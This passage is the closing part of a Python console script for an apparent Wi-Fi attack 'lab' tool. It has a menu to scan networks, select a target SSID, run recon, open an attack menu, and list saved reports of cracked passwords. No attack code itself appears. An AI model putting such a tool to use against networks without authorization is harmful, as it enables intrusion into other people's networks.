                    border_style="red"))
            console.print("\n[dim]Press any key...[/dim]"); msvcrt.getch()

        elif key == "2":
            if not nets:
                console.print("[red]Scan first (option 1)[/red]"); time.sleep(1.5); continue
            _banner()
            console.print(Padding(build_scan_table(nets),(0,2)))
            idx = Prompt.ask("[cyan]Enter network number[/cyan]",
                             default="1")
            try:
                target = nets[int(idx)-1]
                console.print(f"[bold green]Target set → {target.get('ssid')}[/bold green]")
            except (ValueError, IndexError):
                console.print("[red]Invalid number.[/red]")
            time.sleep(1.2)

        elif key == "3":
            if not target:
                console.print("[red]Select a target first (option 2)[/red]"); time.sleep(1.5); continue
            show_recon(target)
            console.print("[dim]Press any key...[/dim]"); msvcrt.getch()

        elif key == "4":
            if not target:
                console.print("[red]Select a target first (option 2)[/red]"); time.sleep(1.5); continue
            attack_menu(target)

        elif key == "5":
            rpt = Path("wifi_lab_report.json")
            if not rpt.exists():
                console.print("[dim]No reports yet.[/dim]"); time.sleep(1.5); continue
            try:
                data = json.loads(rpt.read_text())
                tbl  = Table(box=box.SIMPLE_HEAVY, border_style="bright_green",
                             header_style="bold bright_green", show_lines=True,
                             title="[bold bright_green]  SAVED REPORTS  [/]")
                tbl.add_column("TIMESTAMP",  style="dim",  width=20)
                tbl.add_column("SSID",       style="cyan", width=20)
                tbl.add_column("RESULT",     width=12)
                tbl.add_column("PASSWORD",   style="bold bright_green", width=18)
                tbl.add_column("ATTEMPTS",   style="dim",  width=10)
                for r in data[-15:]:
                    res_col="bold green" if r["result"]=="CRACKED" else "dim red"
                    tbl.add_row(r["timestamp"][:19], r["target_ssid"],
                                Text(r["result"],style=res_col),
                                r.get("password") or "—",
                                str(r.get("attempts",0)))
                _banner()
                console.print(Padding(tbl,(0,2)))
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            console.print("\n[dim]Press any key...[/dim]"); msvcrt.getch()


if __name__ == "__main__":
    main()
